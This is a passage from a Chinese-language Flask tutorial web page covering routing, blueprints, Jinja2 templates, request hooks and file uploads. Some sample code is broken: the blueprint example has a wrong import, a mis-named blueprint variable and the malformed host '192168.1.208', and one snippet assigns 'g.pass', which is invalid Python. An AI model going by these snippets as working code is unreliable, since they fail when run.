//cdn.example.com/test.js # http和https两种方式皆可访问

此时不加https而是直接域名访问会出现404,是因为nginx配置已修改为443端口,而不是80,在nginx配置文件前面添加
server {
    listen 80;
    server_name example.com;
    rewrite ^(.*)$ https://example.com$1;
}

</pre>
</div>

<div id="flask">
<h3>flask</h3><pre>
Flask是用python开发的基于Werkzeug和Jinja2的微Web开发框架
Flask的目标是保持核心简单而又可扩展,默认Flask不包含数据库抽象层、表单验证或者其他已有的库可以处理的东西。然而Flask通过扩展为应用添加这些功能,大量的扩展用以支持数据库整合、表单验证、上传处理和各种开放验证等

pip install flask
where flask
pip install -U https://github.com/pallets/flask/archive/master.tar.gz # 在正式发行之前使用最新的Flask开发版本

依赖
当安装Flask时以下配套软件会被自动安装。
Werkzeug 用于实现WSGI,应用和服务之间的标准Python接口
Jinja 用于渲染页面的模板语言
MarkupSafe 与Jinja共用,在渲染页面时用于避免不可信的输入,防止注入攻击
ItsDangerous 保证数据完整性的安全标志数据,用于保护Flask的session cookie
Click 是一个命令行应用的框架。用于提供flask命令,并允许添加自定义管理命令

可选依赖
以下配套软件不会被自动安装。如果安装了那么Flask会检测到这些软件
Blinker 为信号提供支持。
SimpleJSON 是一个快速的JSON实现,兼容Python's json模块。如果安装了这个软件,那么会优先使用这个软件来进行JSON操作。
python-dotenv 当运行flask命令时为通过dotenv设置环境变量提供支持。
Watchdog 为开发服务器提供快速高效的重载。

</pre>

<h4>flask启动一个本地开发服务器</h4><pre>
启动方式一：

</pre><textarea>
# 创建hello.py文件
from flask import Flask
app = Flask(__name__)
@app.route('/')
def index():
    return 'Hello Flask'

print(app.url_map)
app.run()             # Flask类的run()方法默认在本地开发服务器上运行应用程序

>python app.py
 * Serving Flask app "app" (lazy loading)
 * Environment: development
 * Debug mode: on
 * Restarting with stat
 * Debugger is active!
 * Debugger PIN: 226-179-218
 * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)

</textarea><pre>
项目启动参数配置
- debug是否开启调试模式,开启后修改python代码会自动重启
- threaded是否开启多线程
- port启动指定服务器端口号,默认5000
- host主机,默认是127.0.0.1代表本地开发环境,指定为0.0.0.0代表本机IP
def run(self, host=None, port=None, debug=None, load_dotenv=True, **options)
app.run(debug=True, port=8000, host='0.0.0.0')

启动方式二：
</pre><textarea>
# Flask类的实例将会成为WSGI应用,第一个参数是应用模块或包的名称。如果使用一个单一模块则应当使用__name__,因为名称会根据这个模块是按应用方式使用还是作为一个模块导入而发生变化(可能是'__main__' ,也可能是实际导入的名称)。这个参数是必需的,这样Flask才能知道在哪里可以找到模板和静态文件等东西

from flask import Flask
app = Flask(__name__)

@app.route('/')
def index():
    return 'Index Page'

@app.route('/hello') # 使用route()装饰器来告诉Flask触发函数的URL
def hello():         # 函数名称被用于生成相关联的URL。函数最后返回需要在用户浏览器中显示的信息
    return 'hello world'

</textarea><pre>
可以使用flask命令或python的-m开关来运行这个应用。在运行应用之前,需要在终端里导出FLASK_APP环境变量,FLASK_APP环境变量中储存的是模块的名称,运行flask run命令就会导入这个模块:
$ export FLASK_APP=hello.py
$ flask run
$ python -m flask run # 同上
 * Running on http://127.0.0.1:5000/

$ flask run --host=0.0.0.0

windows
C:\path\to\app>set FLASK_APP=hello.py
PS C:\path\to\app> $env:FLASK_APP = "hello.py"

Flask会根据以下规则自动探测程序实例：
1、从当前目录寻找app.py和wsgi.py模块,并从中寻找名为app或application的实例
2、从环境变量FLASK_APP对应的值寻找名为app或application的实例

调试模式
虽然flask命令可以方便地启动一个本地开发服务器,但是每次应用代码修改之后都需要手动重启服务器。这样不是很方便, Flask可以做得更好。如果打开调试模式,那么服务器会在修改应用代码之后自动重启,并且当应用出错时还会提供一个有用的调试器。
app.run(debug=True) # 设置debug=True是为了让代码修改实时生效,而不用每次重启加载

如果需要打开所有开发功能(激活调试器、激活自动重载、打开Flask应用的调试模式),那么要在运行服务器之前导出FLASK_ENV环境变量并把其设置为development,还可以通过导出FLASK_DEBUG=1来单独控制调试模式的开关:
$ export FLASK_ENV=development # Windows下需要使用set来代替export
$ flask run

虽然交互调试器不能在分布环境下工作(这使得它基本不可能用于生产环境),但它允许执行任意代码,这样会成为一个重大安全隐患,因此绝对不能在生产环境中使用调试器

</pre><textarea>
from flask import Flask
import flask; print([e for e in dir(flask) if not e.startswith('_')])

app = Flask(__name__)
app.config['ENV'] = 'development'

@app.route('/')
def index():
    print([e for e in dir(app) if not e.startswith('_')])
    print(app.config)
    return 'index'

if __name__ == '__main__':
    app.run(debug=True)

['Blueprint', 'Config', 'Flask', 'Markup', 'Request', 'Response', 'abort', 'after_this_request', 'app', 'appcontext_popped', 'appcontext_pushed', 'appcontext_tearing_down', 'before_render_template', 'blueprints', 'cli', 'config', 'copy_current_request_context', 'ctx', 'current_app', 'escape', 'flash', 'g', 'get_flashed_messages', 'get_template_attribute', 'globals', 'got_request_exception', 'has_app_context', 'has_request_context', 'helpers', 'json', 'json_available', 'jsonify', 'logging', 'make_response', 'message_flashed', 'redirect', 'render_template', 'render_template_string', 'request', 'request_finished', 'request_started', 'request_tearing_down', 'safe_join', 'send_file', 'send_from_directory', 'session', 'sessions', 'signals', 'signals_available', 'stream_with_context', 'template_rendered', 'templating', 'url_for', 'wrappers']

['add_template_filter', 'add_template_global', 'add_template_test', 'add_url_rule', 'after_request', 'after_request_funcs', 'app_context', 'app_ctx_globals_class', 'auto_find_instance_path', 'before_first_request', 'before_first_request_funcs', 'before_request', 'before_request_funcs', 'blueprints', 'cli', 'config', 'config_class', 'context_processor', 'create_global_jinja_loader', 'create_jinja_environment', 'create_url_adapter', 'debug', 'default_config', 'dispatch_request', 'do_teardown_appcontext', 'do_teardown_request', 'endpoint', 'env', 'error_handler_spec', 'errorhandler', 'extensions', 'finalize_request', 'full_dispatch_request', 'get_send_file_max_age', 'got_first_request', 'handle_exception', 'handle_http_exception', 'handle_url_build_error', 'handle_user_exception', 'has_static_folder', 'import_name', 'inject_url_defaults', 'instance_path', 'iter_blueprints', 'jinja_env', 'jinja_environment', 'jinja_loader', 'jinja_options', 'json_decoder', 'json_encoder', 'log_exception', 'logger', 'make_config', 'make_default_options_response', 'make_null_session', 'make_response', 'make_shell_context', 'name', 'open_instance_resource', 'open_resource', 'open_session', 'permanent_session_lifetime', 'preprocess_request', 'preserve_context_on_exception', 'process_response', 'propagate_exceptions', 'raise_routing_exception', 'register_blueprint', 'register_error_handler', 'request_class', 'request_context', 'response_class', 'root_path', 'route', 'run', 'save_session', 'secret_key', 'select_jinja_autoescape', 'send_file_max_age_default', 'send_static_file', 'session_cookie_name', 'session_interface', 'shell_context_processor', 'shell_context_processors', 'should_ignore_error', 'static_folder', 'static_url_path', 'subdomain_matching', 'teardown_appcontext', 'teardown_appcontext_funcs', 'teardown_request', 'teardown_request_funcs', 'template_context_processors', 'template_filter', 'template_folder', 'template_global', 'template_test', 'templates_auto_reload', 'test_cli_runner', 'test_cli_runner_class', 'test_client', 'test_client_class', 'test_request_context', 'testing', 'trap_http_exception', 'try_trigger_before_first_request_functions', 'update_template_context', 'url_build_error_handlers', 'url_default_functions', 'url_defaults', 'url_map', 'url_map_class', 'url_rule_class', 'url_value_preprocessor', 'url_value_preprocessors', 'use_x_sendfile', 'view_functions', 'wsgi_app']

< Config {'ENV': 'production', 'DEBUG': True, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': b'_5#y2L"F4Q8z\n\xec]/', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(seconds=43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>


</textarea>
</div>

<div id="flask_route">
<h4>路由</h4><pre>
werkzeug.routing

Flask中的route()装饰器用于将URL绑定到函数
@app.route('/hello')
def hello_world():
   return 'hello world'

@app.route('/')
@app.route('/index')
def index():
    return 'Hello world'

在这里URL '/ hello'规则绑定到hello_world()函数,因此如果用户访问http：//localhost：5000/hello URL,hello_world()函数的输出将在浏览器中呈现。

application对象的add_url_rule()函数也可用于将URL与函数绑定,使用route()装饰器的目的也由以下表示：
def hello_world():
   return 'hello world'
app.add_url_rule('/', 'hello', hello_world)

【 变量规则 】
通过把URL的一部分标记为< variable_name>就可以在URL中添加变量。标记的部分会作为关键字参数传递给函数。通过使用< converter:variable_name> 可以选择性的加上一个转换器,为变量指定规则

转换器类型：
string (缺省值) 接受任何不包含斜杠的文本
int  接受正整数
float  接受正浮点数
path  类似string,但可以包含斜杠
uuid  接受UUID字符串

</pre><textarea>
from flask import Flask
app = Flask(__name__)

@app.route('/user/< username>')
def show_user_profile(username):   # show the user profile for that user
    return 'User %s' % escape(username)

@app.route('/post/< int:post_id>')
def show_post(post_id):            # show the post with the given id, the id is an integer
    return 'Post %d' % post_id

@app.route('/rev/< float:revNo>')
def revision(revNo):
   return 'Revision Number %f' % revNo

@app.route('/path/< path:subpath>')
def show_subpath(subpath):         # show the subpath after /path/
    return 'Subpath %s' % escape(subpath)

# http://127.0.0.1:5000/page/11-22输出11 22
@app.route('/page/< int:num1>-< int:num2>')
def page(num1, num2):
    print(num1, num2)
    return 'hello world'

if __name__ == '__main__':
   app.run(debug = True)

</textarea><pre>
【 唯一的URL/重定向行为 】
Flask的URL规则基于Werkzeug的路由模块。这确保形成的URL是唯一的,并且基于Apache规定的先例

以下两条规则的不同之处在于是否使用尾部的斜杠
projects的URL是中规中矩的,尾部有一个斜杠,看起来就如同一个文件夹。访问一个没有斜杠结尾的URL时Flask会自动进行重定向在尾部加上一个斜杠。
about的URL没有尾部斜杠,因此其行为表现与一个文件类似。如果访问这个URL时添加了尾部斜杠就会得到一个404错误。这样可以保持URL唯一,并帮助搜索引擎避免重复索引同一页面。

</pre><textarea>
# http://127.0.0.1:5000/projects -> http://127.0.0.1:5000/projects/
# http://127.0.0.1:5000/projects/
@app.route('/projects/')
def projects():
    return 'The project page'

# http://127.0.0.1:5000/about
# http://127.0.0.1:5000/about/ not found
@app.route('/about')
def about():
    return 'The about page'

</textarea><pre>
【 URL构建 】
url_for()函数用于构建指定函数的URL。它把函数名称作为第一个参数。它可以接受任意个关键字参数,每个关键字参数对应URL中的变量。未知变量将添加到URL中作为查询参数。

为什么不在把URL写死在模板中,而要使用反转函数url_for()动态构建？
1、反转通常比硬编码URL的描述性更好。
2、可以只在一个地方改变URL,而不用到处乱找。
3、URL创建会处理特殊字符的转义和Unicode数据,比较直观。
4、生产的路径总是绝对路径,可以避免相对路径产生副作用。
5、如果应用是放在URL根路径之外的地方(如在/myapplication中,不在/中), url_for()会妥善处理。

使用test_request_context()方法来尝试使用url_for()。test_request_context()告诉Flask正在处理一个请求,而实际上也许正处在交互Python shell之中,并没有真正的请求

</pre><textarea>
from flask import Flask, escape, url_for
app = Flask(__name__)

@app.route('/')
def index():
    return 'index'

@app.route('/login')
def login():
    return 'login'

@app.route('/profile/< username>')
def profile(username):
    return '{}\'s profile'.format(escape(username))

with app.test_request_context():
    print(url_for('index'))  # /
    print(url_for('login'))  # /login
    print(url_for('login', next='/'))  # /login?next=/
    print(url_for('profile', username='John Doe'))  # /profile/John%20Doe

</textarea><textarea>
from flask import Flask, url_for
app = Flask(__name__)

@app.route('/')
def index():
    pass

@app.route('/user/< name>')
def user(name):
    pass

@app.route('/page/< int:num>')
def page(num):
    pass

@app.route('/test')
def test():
    print(url_for('index'))  # /
    print(url_for('user', name='letian'))  # /user/letian
    print(url_for('page', num=1, q='hadoop mapreduce 10%3'))  # /page/1?q=hadoop+mapreduce+10%253
    print(url_for('static', filename='uploads/01.jpg'))  # /static/uploads/01.jpg
    return 'Hello'

if __name__ == '__main__':
    app.run(debug=True)

</textarea><textarea>
from flask import redirect

@blue.route('/redirect/')
def make_redirect():
    return redirect(url_for('first.index'))

</textarea><textarea>
from flask import Flask, redirect, url_for
app = Flask(__name__)
@app.route('/admin')
def hello_admin():
   return 'Hello Admin'

@app.route('/guest/< guest>')
def hello_guest(guest):
   return 'Hello %s as Guest' % guest

# 检查接收的参数是否与'admin'匹配。如果匹配则使用url_for()将应用程序重定向到hello_admin()函数,否则重定向到将接收的参数作为guest参数传递给它的hello_guest()函数
@app.route('/user/< name>')
def hello_user(name):
   if name =='admin':
      return redirect(url_for('hello_admin'))
   else:
      return redirect(url_for('hello_guest',guest = name))

if __name__ == '__main__':
   app.run(debug = True)

</textarea><pre>
【 HTTP方法 】
Web应用使用不同的HTTP方法处理URL,缺省情况下一个路由只回应GET请求。可以使用route()装饰器的methods参数来处理不同的HTTP方法
如果当前使用了GET方法,Flask会自动添加HEAD方法支持,并且同时还会按照HTTP RFC来处理HEAD请求。同样, OPTIONS也会自动实现。

GET: 以未加密的形式将数据发送到服务器;浏览器要被请求网页的数据;
HEAD: 和GET方法相同,但没有响应体;浏览器要被请求网页的数据,但只关注headers,而不是page content;
POST: 用于将HTML表单数据发送到服务器。POST方法接收的数据不由服务器缓存;浏览器传递一些新数据,server要储存且只能储存一次数据;
PUT: 用上传的内容替换目标资源的所有当前表示;和POST很像,区别是PUT时server可以多次储存数据;
DELETE: 删除由URL给出的目标资源的所有当前表示;删除相应位置的数据;
OPTIONS: 快速告知client一个URL支持什么样的方法。

</pre>默认Flask路由响应GET请求,但可以通过为route()装饰器提供方法参数来更改此首选项<textarea>
from flask import request

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        return do_the_login()
    else:
        return show_the_login_form()

</textarea><textarea>
from flask import Flask, redirect, url_for, request
app = Flask(__name__)

@app.route('/success/< name>')
def success(name):
   return 'welcome %s' % name

@app.route('/login',methods = ['POST', 'GET'])
def login():
   if request.method == 'POST':
      user = request.form['nm']  # 服务器通过POST方法接收数据,从表单数据获得的"nm"参数的值
      return redirect(url_for('success',name = user))
   else:
      user = request.args.get('nm') # 服务器通过GET方法接收数据,args是包含表单参数对及其对应值对的列表的字典对象
      return redirect(url_for('success',name = user))

if __name__ == '__main__':
   app.run(debug = True)

</textarea><pre>
【 静态文件 】
动态的web应用也需要静态文件,一般是CSS和JS文件。理想情况下服务器已经配置好了为提供静态文件的服务。但在开发过程中Flask也能做好这项工作。只要在包或模块旁边创建一个名为static的文件夹就行了。静态文件位于应用的/static中。
使用特定的'static'端点就可以生成相应的URL
url_for('static', filename='style.css') # 这个静态文件在文件系统中的位置应该是static/style.css
< script src = "{{ url_for('static', filename = 'hello.js') }}" >< /script>

</pre>
</div>

<div id="flask_blueprint">
<h4>blueprint蓝图实现路由分层管理、视图方法模块化</h4><pre>
将flask所有的请求方法写在同一个路由视图文件中会导致代码显得很没有逻辑性,如果后期想要修改代码或添加新的代码的话就不知道如何的下手,此时就需要蓝图来解决这个问题了,django中的app的主要作用就是将django的项目分成一个个单独的app,然后将所有的app分配不同的处理功能,通过路由分配将它们连接成一个大的django项目,Flask中的蓝图和django中的app功能大同小异

一个蓝图定义了可用于单个应用的视图,模板,静态文件等的集合
蓝图的杀手锏是将应用组织成不同的组件,比如把的admin、user相关的视图方法分为两个组件模块：admin组件和user组件,这时可以创建两个蓝图实现这两个独立的组件

</pre><textarea>
app
├─static
│  ├─admin
│  │  ├─css
│  │  ├─js
│  │  └─images
│  └─user
│     ├─css
│     ├─js
│     └─images
├─templates
│  ├─admin
│  │  └─index.html
│  └─user
│     └─index.html
├─__init__.py
├─models.py
├─admin.py
├─user.py
├─views.py
├─config.py
└─run.py

### 主路由配置文件manager.py启动整个flask框架项目
from flask import flask  # 从flask中导入Flask用于创建主app
from admin import admin  # 将创建的admin、user两个蓝图添加到文件中
from user import user

app = Flask(__name__)    # 创建flask的主app

# 将添加进来的蓝图注册到主app中
# user.py、admin.py两个文件相当于django中的两个app了,不同是django中的路由分配是将大的路由通过include分配给app的urls.py,而Flask是通过蓝图注册的方式将蓝图添加到主app中,
# user.py,admin.py中的主要是创建蓝图,然后为创建的蓝图可以添加部分的路由配置,接着就可以在主路由文件manage.py中将创建的蓝图注册到主app中了
app.register_blueprint(admin)
app.register_blueprint(user)

# manager.py中的部分路由
@app.route('/')
def index():
    return 'index'

@app.route('/list')
def list():
    return 'list'

if __name__ == '__main__':
    print(app.url_map)
    app.run(host='192168.1.208')  # 启动主app启动项目

### flaskapp/admin.py
from flask import Blueprint  # 从flask中导入Blueprint
user = Blueprint('admin', __name__)  # 创建一个蓝图,Blueprint必须指定两个参数,admin表示蓝图的名称,__name__表示蓝图是在的模块

# 用该蓝图来设置路由方法
@admin.route('/admin/hello')
def hello():
    return '/user/hello'

@admin.route('admin/new')
def new():
    return 'user/new'

### flaskapp/user.py
from flask import Blueprint  # 从flask中导入Blueprint
user = Blueprint('user', __name__)  # 创建一个蓝图,Blueprint必须指定两个参数,user表示蓝图的名称,__name__表示蓝图是在的模块

# 用该蓝图来设置路由方法
@user.route('/user/hello')
def hello():
    return '/user/hello'

@user.route('user/new')
def new():
    return 'user/new'

</textarea>
</div>

<div id="flask_template">
<h4>渲染模板</h4><pre>
Python代码生成HTML内容很麻烦,尤其在需要放置变量数据和Python语言元素如条件或循环时,这需要经常从HTML中转义,以确保应用的安全
这时可以利用Flask所基于的Jinja2模板引擎,而不是从函数返回硬编码HTML,可以通过render_template()函数呈现HTML文件
使用render_template()方法可以渲染模板,只要提供模板名称和需要作为参数传递给模板的变量就行了

flask.render_template(template_name_or_list, **context)
Renders a template from the template folder with the given context.

flask.render_template_string(source, **context)
Renders a template from the given template source string with the given context.

flask.get_template_attribute(template_name, attribute)
Loads a macro (or variable) a template exports. This can be used to invoke a macro from within Python code.

web templating system(web模板系统)指的是设计一个HTML脚本,其中可以动态插入变量数据。web模板系统包括模板引擎,某种数据源和模板处理器。
Flask使用jinga2模板引擎。Web模板包含用于变量和表达式(在这些情况下为Python表达式)的HTML语法散布占位符,这些是在呈现模板时替换的值

Jinja2模板引擎使用以下分隔符从HTML转义。
{% ... %}用于语句
{{ ... }}用于表达式可以打印到模板输出
{# ... #}用于未包含在模板输出中的注释
# ... ##用于行语句

</pre><textarea>
from flask import render_template

@app.route('/hello/')
@app.route('/hello/< name>')
def hello(name=None):
    return render_template('hello.html', name=name)

# Flask会在templates文件夹内寻找模板。因此如果应用是一个模块,那么模板文件夹应该在模块旁边;如果是一个包,那么就应该在包里面：
# 情形 1 : 一个模块:
/application.py
/templates
    /hello.html

# 情形 2 : 一个包:
/application
    /__init__.py
    /templates
        /hello.html

# 模板示例：
< !doctype html>
< title>Hello from Flask< /title>
{% if name %}
  < h1>Hello {{ name }}!< /h1>
{% else %}
  < h1>Hello, World!< /h1>
{% endif %}

</textarea><pre>
在模板内部可以和访问get_flashed_messages()函数一样访问request, session, g, get_flashed_messages()

模板在继承使用的情况下尤其有用,模板继承可以使每个页面的特定元素(如页头、导航和页尾) 保持一致。

自动转义默认开启。因此如果name包含HTML,那么会被自动转义。如果可以信任某个变量,且知道它是安全的HTML(例如变量来自一个把wiki标记转换为HTML的模块),那么可以使用Markup类把它标记为安全的,或者在模板中使用|safe过滤器

</pre>Markup类的基本使用方法<textarea>
>>> from flask import Markup
>>> Markup('<strong>Hello %s!</strong>') % '<blink>hacker</blink>'
Markup(u'<strong>Hello &lt;blink&gt;hacker&lt;/blink&gt;!</strong>')
>>> Markup.escape('<blink>hacker</blink>')
Markup(u'&lt;blink&gt;hacker&lt;/blink&gt;')
>>> Markup('<em>Marked up</em> &raquo; HTML').striptags()
u'Marked up \xbb HTML'

</textarea>模板继承<textarea>
mkdir HelloWorld
mkdir HelloWorld/static
mkdir HelloWorld/templates
touch HelloWorld/server.py

### HelloWorld/templates/default.html
< html>
< head>
< title>{% if page_title %}{{ page_title }}{% endif %}< /title>
< /head>
< body>
    {% block body %}{% endblock %}
< /body>
< /html>

### HelloWorld/templates/user_info.html
{% extends "default.html" %}

{% block body %}
    {% for key in user_info %}
        {{ key }}: {{ user_info[key] }}
    {% endfor %}
{% endblock %}

### HelloWorld/server.py
from flask import Flask, render_template
app = Flask(__name__)

@app.route('/')
def hello_world():
    return 'hello world'

@app.route('/user')
def user():
    user_info = {'name': 'letian','email': '123@aa.com','github': 'https://github.com/letiantian'    }
    return render_template('user_info.html', page_title='letian\'s info', user_info=user_info)

if __name__ == '__main__':
    app.run(port=5000, debug=True)

</textarea>
</div>

<div id="flask_request">
<h4>request</h4><pre>
除request和session这类请求上下文对象(request context),还有一类叫做应用上下文对象(application context),current_app和g都属于应用上下文对象。
current_app: 表示当前运行程序文件的程序实例。
g: 处理请求时,用于临时存储的对象,每次请求都会重设这个变量,其实它就是一个存储容器,想往里面存储什么样的数据都可以。

</pre><textarea>
from flask import Flask,g
app = Flask(__name__)

@app.route('/')
def hello_world():
    g.username = "JavaandPython君"
    g.pass = "123"
    return 'hello world'

if __name__ == '__main__':
 app.run()

</textarea><pre>
【 操作请求数据 】
对于web应用来说对客户端向服务器发送的数据作出响应很重要。在Flask中由全局对象request来提供请求信息。既然这个对象是全局的,怎么还能保持线程安全？答案是本地环境
某些对象在Flask中是全局对象,但不是通常意义下的全局对象,这些对象实际上是特定环境下本地对象的代理

设想现在处于处理线程的环境中。一个请求进来了,服务器决定生成一个新线程(或叫其他什么名称的东西,这个下层的东西能够处理包括线程在内的并发系统)。当Flask开始其内部请求处理时会把当前线程作为活动环境,并把当前应用和WSGI环境绑定到这个环境(线程)。它以一种聪明的方式使得一个应用可以在不中断的情况下调用另一个应用。

这对你有什么用？基本上你可以完全不必理会。这个只有在做单元测试时才有用。在测试时会遇到由于没有请求对象而导致依赖于请求的代码会突然崩溃的情况。对策是自己创建 一个请求对象并绑定到环境。最简单的单元测试解决方案是使用test_request_context()环境管理器。通过使用with语句可以绑定一个测试请求,以便于交互

</pre><textarea>
from flask import request

with app.test_request_context('/hello', method='POST'):
    # now you can do something with the request until the end of the with block, such as basic assertions:
    assert request.path == '/hello'
    assert request.method == 'POST'

# 另一种方式是把整个WSGI环境传递给request_context()方法:
from flask import request
with app.request_context(environ):
    assert request.method == 'POST'

</textarea><pre>
【 flask钩子：flask网络请求拦截器before_request,after_request,teardown_request 】
after_request
每一个请求之后绑定一个函数,如果请求没有异常。在请求之后运行,会接收一个参数,这个参数就是前面的请求处理完毕之后, 返回的响应数据,如果需要对响应做额外处理,可以再这里进行

teardown_request
每一个请求之后绑定一个函数,即使遇到了异常
每一次请求之后都会调用,会接受一个参数,参数是服务器出现的错误信息

@app.before_request
一个装饰器,他所装饰的函数都会在请求进入视图函数之前执行,在每一次请求都会执行,可以在这里做权限校验操作,比如说某用户是黑名单用户,黑名单用户登录系统将遭到拒绝访问,可以使用before_request进行权限校验

@app.before_first_request
与@app.before_request极为相似,只不过它只会被执行一次,在第一次请求之前运行,只需执行一次,如链接数据库

</pre><textarea>
from flask import Flask
app = Flask(__name__)

@app.route('/')
def helloworld():
    return 'hello world'

# 在第一次请求之前运行,比如连接数据库操作, 只需要执行一次
@app.before_first_request
def before_first_request():
    print('before_first_request')

# 在每一次请求都会执行,可以在这里做权限校验操作,比如说某用户是黑名单用户,黑名单用户登录系统将遭到拒绝访问,可以使用before_request进行权限校验
@app.before_request
def before_request():
    print('before_request')

# 在请求之后运行
@app.after_request
def after_request(response):
    # response就是前面的请求处理完毕之后,返回的响应数据,如果需要对响应做额外处理,可以再这里进行
    response.headers["Content-Type"] = "application/json"
    print('after_request')
    return response

# 每一次请求之后都会调用,会接受一个参数,参数是服务器出现的错误信息
@app.teardown_request
def teardown_request(error):
    # 数据库的扩展, 可以实现自动提交数据库
    print('teardown_request: error %s' % error)

if __name__ == '__main__':
    app.run(debug=True)

</textarea><textarea>
from flask import Flask, request, redirect, session

app = Flask(__name__)
app.secret_key = "DragonFire"

@app.before_request
def is_login():
    if request.path == "/login":
        return None

    if not session.get("user"):
        return redirect("/login")

@app.route("/login")
def login():
    return "Login"

@app.route("/index")
def index():
    return "Index"

@app.route("/home")
def home():
    return "Login"

app.run("0.0.0.0", 5000)

</textarea>@app.before_request等同下面的application.before_request<textarea>
@application.before_request
def print_request_info():
    print("请求地址：" + str(request.path))
    print("请求方法：" + str(request.method))
    print("---请求headers--start--")
    print(str(request.headers).rstrip())
    print("---请求headers--end----")
    print("GET参数：" + str(request.args))
    print("POST参数：" + str(request.form))

</textarea>@app.after_request在响应(response)之前做出响应<textarea>
@app.after_request
def foot_log(response):
    if request.path != "/login":
        print("有客人访问了",request.path)
    return response

</textarea><pre>
【 request对象 】
print([e for e in dir(request) if not e.startswith('_')])
['accept_charsets', 'accept_encodings', 'accept_languages', 'accept_mimetypes', 'access_route', 'application', 'args', 'authorization', 'base_url', 'blueprint', 'cache_control', 'charset', 'close', 'content_encoding', 'content_length', 'content_md5', 'content_type', 'cookies', 'data', 'date', 'dict_storage_class', 'disable_data_descriptor', 'encoding_errors', 'endpoint', 'environ', 'files', 'form', 'form_data_parser_class', 'from_values', 'full_path', 'get_data', 'get_json', 'headers', 'host', 'host_url', 'if_match', 'if_modified_since', 'if_none_match', 'if_range', 'if_unmodified_since', 'input_stream', 'is_json', 'is_multiprocess', 'is_multithread', 'is_run_once', 'is_secure', 'is_xhr', 'json', 'json_module', 'list_storage_class', 'make_form_data_parser', 'max_content_length', 'max_form_memory_size', 'max_forwards', 'method', 'mimetype', 'mimetype_params', 'on_json_loading_failed', 'parameter_storage_class', 'path', 'pragma', 'query_string', 'range', 'referrer', 'remote_addr', 'remote_user', 'routing_exception', 'scheme', 'script_root', 'shallow', 'stream', 'trusted_hosts', 'url', 'url_charset', 'url_root', 'url_rule', 'user_agent', 'values', 'view_args', 'want_form_data_parsed']

form - 它是一个字典对象,包含表单参数及其值的键和值对,request.form会自动解析数据
args - 解析查询字符串的内容,它是问号(？)之后的URL的一部分。
cookies  - 保存Cookie名称和值的字典对象。
files - 与上传文件有关的数据,file_content = request.files['image'].stream.read()
method - 当前请求方法

通过使用method属性可以操作当前请求方法,通过使用form属性处理表单数据,在POST或PUT请求中传输的数据
当form属性中不存在这个键时会引发一个KeyError。如果不像捕捉一个标准错误一样捕捉KeyError,那么会显示一个HTTP 400 Bad Request错误页面,因此多数情况下不必处理这个问题。

要操作URL如?key=value中提交的参数可以使用args属性:
searchword = request.args.get('key', '')
http://127.0.0.1:5000/?user=Flask&time&p=7&p=8
pl = request.args.getlist('p')  # 返回一个list
用户可能会改变URL导致出现一个400请求出错页面,这样降低了用户友好度。因此推荐使用get或通过捕捉KeyError来访问URL参数。

</pre><textarea>
from flask import request

@app.route('/login', methods=['POST', 'GET'])
def login():
    error = None
    if request.method == 'POST':
        if valid_login(request.form['username'], request.form['password']):
            return log_the_user_in(request.form['username'])
        else:
            error = 'Invalid username/password'
    # the code below is executed if the request method was GET or the credentials were invalid
    return render_template('login.html', error=error)

</textarea><textarea>
from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def hello_world():
    return 'hello world'

@app.route('/register', methods=['POST'])
def register():
    print(request.headers)
    # print(request.stream.read()) # 不要用,否则下面的form取不到数据
    print(request.form)  # ImmutableMultiDict([('name', 'letian'), ('password', '123')])
    print(request.form['name'])                           # letian
    print(request.form.get('name'))                       # letian
    print(request.form.getlist('name'))                   # ['letian']
    print(request.form.get('nickname', default='apple'))  # apple
    return 'welcome'

@app.route('/add', methods=['POST'])
def add():
    print(request.headers)
    print(type(request.json))     # < class 'dict'>
    print(request.json)           # {'a': 1, 'b': 2}
    sum = request.json['a'] + request.json['b']
    print(str(sum))               # 3
    result = {'sum': sum}
    return result                 # 响应json数据

if __name__ == '__main__':
    app.run(port=5000, debug=True)

</textarea>
</div>

<div id="flask_upload">
<h4>文件上传</h4><pre>
用Flask处理文件上传很容易,只要确保在HTML表单中设置enctype="multipart/form-data"属性就可以了,否则浏览器将不会传送文件。
已上传的文件被储存在内存或文件系统的临时位置,可以通过请求对象files属性来访问上传的文件,每个上传的文件都储存在这个字典型属性中。这个属性基本和标准Python file对象一样,另外多出一个用于把上传文件保存到服务器的文件系统中的save()方法

</pre><textarea>
from flask import request

@app.route('/upload', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['the_file']
        f.save('/var/www/uploads/uploaded_file.txt')

</textarea><pre>
如果想要知道文件上传之前其在客户端系统中的名称,可以使用filename属性,但这个值是可伪造的。如果想要把客户端的文件名作为服务器上的文件名,可以通过Werkzeug提供的secure_filename()函数,有一条原则是"永远不要信任用户输入"。这条原则同样适用于已上传文件的文件名。所有提交的表单数据可能是伪造的,文件名也可以是危险的。在把文件保存到文件系统之前总是要使用这个函数对文件名进行安检

</pre><textarea>
from flask import request
from werkzeug.utils import secure_filename

@app.route('/upload', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['the_file']
        f.save('/var/www/uploads/' + secure_filename(f.filename))

</textarea><pre>
